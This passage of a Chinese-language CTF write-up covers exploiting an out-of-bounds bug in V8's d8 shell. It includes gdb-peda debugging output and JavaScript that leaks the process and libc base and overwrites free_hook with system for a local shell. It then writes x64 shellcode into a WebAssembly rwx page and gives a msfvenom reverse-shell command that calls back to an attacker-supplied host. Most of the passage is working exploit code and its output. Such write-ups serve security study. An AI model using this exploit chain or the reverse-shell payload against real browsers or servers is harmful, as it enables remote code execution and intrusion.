mapped : 0x3a9ed418076b --> 0x180b71000055df6d 
--More--(25/257)j
mapped : 0x3a9ed418077b --> 0x181f49000055df6d 
mapped : 0x3a9ed41807a3 --> 0x180b71000055df6d 
mapped : 0x3a9ed41807b3 --> 0x180941000055df6d 
mapped : 0x3a9ed41807f3 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180803 --> 0x180801000055df6d 
mapped : 0x3a9ed4180903 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180913 --> 0x181f49000055df6d 
mapped : 0x3a9ed418093b --> 0x180b71000055df6d 
mapped : 0x3a9ed418094b --> 0x181f49000055df6d 
mapped : 0x3a9ed4180973 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180983 --> 0x181f49000055df6d 
mapped : 0x3a9ed41809c3 --> 0x180b71000055df6d 
mapped : 0x3a9ed41809d3 --> 0x181f49000055df6d 
mapped : 0x3a9ed41809fb --> 0x180b71000055df6d 
mapped : 0x3a9ed4180a0b --> 0x181f49000055df6d 
mapped : 0x3a9ed4180a3b --> 0x180b71000055df6d 
mapped : 0x3a9ed4180a4b --> 0x180801000055df6d 
mapped : 0x3a9ed4180bf3 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180c03 --> 0x181f49000055df6d 
mapped : 0x3a9ed4180c2b --> 0x180b71000055df6d 
mapped : 0x3a9ed4180c3b --> 0x181f49000055df6d 
mapped : 0x3a9ed4180c63 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180c73 --> 0x181f49000055df6d 
mapped : 0x3a9ed4180c9b --> 0x180b71000055df6d 
mapped : 0x3a9ed4180cab --> 0x180b71000055df6d 
--More--(50/257)
mapped : 0x3a9ed4180cbb --> 0x180801000055df6d 
mapped : 0x3a9ed4180dab --> 0x180b71000055df6d 
mapped : 0x3a9ed4180dbb --> 0x180801000055df6d 
mapped : 0x3a9ed4180ec3 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180ed3 --> 0x180941000055df6d 
mapped : 0x3a9ed4180f1b --> 0x180b71000055df6d 
mapped : 0x3a9ed4180f2b --> 0x180801000055df6d 
mapped : 0x3a9ed4181033 --> 0x180b71000055df6d 
mapped : 0x3a9ed4181043 --> 0x181f49000055df6d 
mapped : 0x3a9ed4181073 --> 0x180b71000055df6d 
mapped : 0x3a9ed4181083 --> 0x181f49000055df6d

gdb-peda$ x/8gx 0x3a9ed4181083 - 3
0x3a9ed4181080: 0x000055df6dff6d40      0x00001ca69a181f49
0x3a9ed4181090: 0x0000000621887fea      0x00000f6ee7b9c469
0x3a9ed41810a0: 0x00001ca69a181f49      0x000000059b40fce6
0x3a9ed41810b0: 0x00000f6ee7b9c4f9      0x00001ca69a180b71

gdb-peda$ vmmap 0x000055df6dff6d40
Start              End                Perm      Name
0x000055df6dfec000 0x000055df6eab4000 r-xp      /home/wz/v8/v8/out.gn/x64.release/d8

gdb-peda$ distance 0x000055df6dff6d40 0x000055df6dd59000
From 0x55df6dff6d40 to 0x55df6dd59000: -2743616 bytes, -685904 dwords

```
最终穷搜的代码如下：
```js
var a = [1.1,2.2,3.3];
var start_addr = addressOf(a) - 0x8000n;
console.log("[*] address of a is 0x"+hex(start_addr));
var leak_d8_addr = 0n;
while(1)
{
    start_addr = start_addr - 8n;
    leak_d8_addr = read64(start_addr);
    if(((leak_d8_addr & 0x0000ff0000000fffn) == 0x0000550000000320n) || ((leak_d8_addr & 0x0000ff0000000fffn) == 0x0000560000000320n)){
        console.log("leak process addr success: " + hex(leak_d8_addr));
        break;
    }
}
console.log("[*] Done.");
proc_base = leak_d8_addr - 0x2b0320n;
console.log("[*] proc base :0x"+hex(proc_base));
```

后面泄露地址和Getshel的代码(get_shell里销毁对象会调用free_hook)：

```js
function get_shell(){
    var shell_str = new String("/bin/sh\0");
}

var printf_got = proc_base + 0xd990d0n;

var printf_addr = read64(printf_got);
console.log("[*] printf addr :0x"+hex(printf_addr));
var libc_base = printf_addr - 0x55800n;
console.log("[*] libc base :0x"+hex(libc_base));
var free_hook = libc_base + 0x3c67a8n;
var system_addr = libc_base + 0x45390n;

writeDataview(free_hook,system_addr);
get_shell();

```

最后成功

```bash
wz@wz-virtual-machine:~/v8/v8/out.gn/x64.release$ ./d8 exp.js 
[*] address of a is 0x00002a0803a078d8
leak process addr success: 000055da25fe3320
[*] Done.
[*] proc base :0x000055da25d33000
[*] printf addr :0x00007fd1ea5be800
[*] libc base :0x00007fd1ea569000
sh: 1: [*]: not found
[*] write to : 0x00007fd1ea92f7a8: 0x00007fd1ea5ae390
sh: 1: : not found
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: : not found
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: : not found
sh: 1: : not found
sh: 1:ª: not found
sh: 1: Syntax error: EOF in backquote substitution
sh: 1: newll_strے: not found
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: Syntax error: word unexpected (expecting ")")
$ sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: Syntax error: EOF in backquote substitution
sh: 1: ��: not found
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: e: not found
sh: 1: e�: not found
sh: 1: e�,Q: not found
sh: 1: e�,Q: not found
sh: 1: e�,Q: not found
sh: 1: @S: not found
sh: 1: pT: not found
sh: 1: 0T: not found
sh: 1: P: not found
sh: 1: �: not found
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 1: : not found
sh: 1: 肩: not found
id
uid=1000(wz) gid=1000(wz) groups=1000(wz),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),130(kvm),131(libvirtd),133(ftp)
$ 

```

## wasm get shell

上述方法只能实现本地提权，因为我们的目标是服务器，需要弹shell回来。最好的方法就是找个rwxp的段写shellcode，这部分介绍的就是wasm来帮我们解决问题。  
wasm是一个关于面向Web的通用二进制和文本格式的项目，是一种新的字节码格式，类似能在浏览器中运行的二进制文件格式。  
在js代码中加入wasm中，程序中会存在一个rwx段，我们可以把sc放到这个段，直接跳过去。  

### 获取wasm段地址

编写一段引入wasm的js代码进行调试，可以在[这个网站](https://wasdk.github.io/WasmFiddle/)在线生成wasm代码，代码如下：

```js
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
%DebugPrint(f);
%SystemBreak();
```

调试过程如下：

```bash
DebugPrint: 0x3850e819fab9: [Function] in OldSpace
 - map: 0x201b0b444379 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x3850e8182109 <JSFunction (sfi = 0x1a6852d88039)>
 - elements: 0x1be206940c71 <FixedArray[0]> [HOLEY_ELEMENTS]
 - function prototype: <no-prototype-slot>
 - shared_info: 0x3850e819fa81 <SharedFunctionInfo 0>
 - name: 0x1be206944ae1 <String[#1]: 0>
 - formal_parameter_count: 0
 - kind: NormalFunction
 - context: 0x3850e8181869 <NativeContext[246]>
 - code: 0x3d6ca6882001 <Code JS_TO_WASM_FUNCTION>
 - WASM instance 0x3850e819f8c1
 - WASM function index 0
 - properties: 0x1be206940c71 <FixedArray[0]> {
    #length: 0x1a6852d804b9 <AccessorInfo> (const accessor descriptor)
    #name: 0x1a6852d80449 <AccessorInfo> (const accessor descriptor)
    #arguments: 0x1a6852d80369 <AccessorInfo> (const accessor descriptor)
    #caller: 0x1a6852d803d9 <AccessorInfo> (const accessor descriptor)
 }

 - feedback vector: not available
0x201b0b444379: [Map]
 - type: JS_FUNCTION_TYPE
 - instance size: 56
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - callable
 - back pointer: 0x1be2069404d1 <undefined>
 - prototype_validity cell: 0x1a6852d80609 <Cell value= 1>
 - instance descriptors (own) #4: 0x3850e81998a9 <DescriptorArray[4]>
 - layout descriptor: (nil)
 - prototype: 0x3850e8182109 <JSFunction (sfi = 0x1a6852d88039)>
 - constructor: 0x1be2069401d9 <null>
 - dependent code: 0x1be2069402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0


Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.

# shared_info字段

gdb-peda$ job 0x3850e819fa81
0x3850e819fa81: [SharedFunctionInfo] in OldSpace
 - map: 0x1be2069409e1 <Map[56]>
 - name: 0x1be206944ae1 <String[#1]: 0>
 - kind: NormalFunction
 - function_map_index: 144
 - formal_parameter_count: 0
 - expected_nof_properties: 0
 - language_mode: sloppy
 - data: 0x3850e819fa59 <WasmExportedFunctionData>
 - code (from data): 0x3d6ca6882001 <Code JS_TO_WASM_FUNCTION>
 - function token position: -1
 - start position: -1
 - end position: -1
 - no debug info
 - scope info: 0x1be206940c61 <ScopeInfo[0]>
 - length: 0
 - feedback_metadata: 0x1be206942a39: [FeedbackMetadata]
 - map: 0x1be206941319 <Map>
 - slot_count: 0

# data 字段

gdb-peda$ job 0x3850e819fa59
0x3850e819fa59: [WasmExportedFunctionData] in OldSpace
 - map: 0x1be206945879 <Map[40]>
 - wrapper_code: 0x3d6ca6882001 <Code JS_TO_WASM_FUNCTION>
 - instance: 0x3850e819f8c1 <Instance map = 0x201b0b449789>
 - function_index: 0

# instance 字段

gdb-peda$ telescope 0x3850e819f8c0+0x88
0000| 0x3850e819f948 --> 0x2142a9697000 --> 0x2142a9697260ba49 
0008| 0x3850e819f950 --> 0xcea73e4e411 --> 0x710000201b0b4491 
0016| 0x3850e819f958 --> 0xcea73e4e681 --> 0x710000201b0b44ad 
0024| 0x3850e819f960 --> 0x3850e8181869 --> 0x1be206940f 
0032| 0x3850e819f968 --> 0x3850e819f9e9 --> 0x710000201b0b44a1 
0040| 0x3850e819f970 --> 0x1be2069404d1 --> 0x1be2069405 
0048| 0x3850e819f978 --> 0x1be2069404d1 --> 0x1be2069405 
0056| 0x3850e819f980 --> 0x1be2069404d1 --> 0x1be2069405 
gdb-peda$ vmmap 0x2142a9697000
Start              End                Perm      Name
0x00002142a9697000 0x00002142a9698000 rwxp      mapped

```

根据上述寻址过程可以寻找rwx段地址，代码如下：

```js
//leak addr
var f_addr = addressOf(f);
console.log("f addr: 0x"+hex(f_addr));
var shared_info_addr = read64(f_addr+0x18n)-0x1n;
var wasm_exported_function = read64(shared_info_addr+0x8n)-0x1n;
var instance_addr = read64(wasm_exported_function+0x10n)-0x1n;
var rwx_page_addr = read64(instance_addr+0x88n);
```

### getshell

利用任意地址写把sc写到这个段，之后通过调用wasm函数获取shell

```js
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
//leak addr
var f_addr = addressOf(f);
console.log("f addr: 0x"+hex(f_addr));
var shared_info_addr = read64(f_addr+0x18n)-0x1n;
var wasm_exported_function = read64(shared_info_addr+0x8n)-0x1n;
var instance_addr = read64(wasm_exported_function+0x10n)-0x1n;
var rwx_page_addr = read64(instance_addr+0x88n);
//write sc
shellcode = [
0x91969dd1bb48c031n,
0x53dbf748ff978cd0n,
0xb05e545752995f54n,
0x50f3bn
];
var data_buf = new ArrayBuffer(128);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
write64(buf_backing_store_addr, rwx_page_addr);
for(var i = 0; i < shellcode.length; i++)
    data_view.setBigUint64(8*i, shellcode[i], true);
f();
```

## 远程getshell

在kali上使用msfvenom生成反弹shell的shellcode

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=you_ip_addr LPORT=3389 -f python -o ~/Desktop/shellcode.txt
```

在服务上监听3389端口本地执行wasm.js，成功获取到shell

![shell](./1.png)

## 参考


[e3pem](https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/)


[walkerfuz](https://www.freebuf.com/vuls/203721.html)
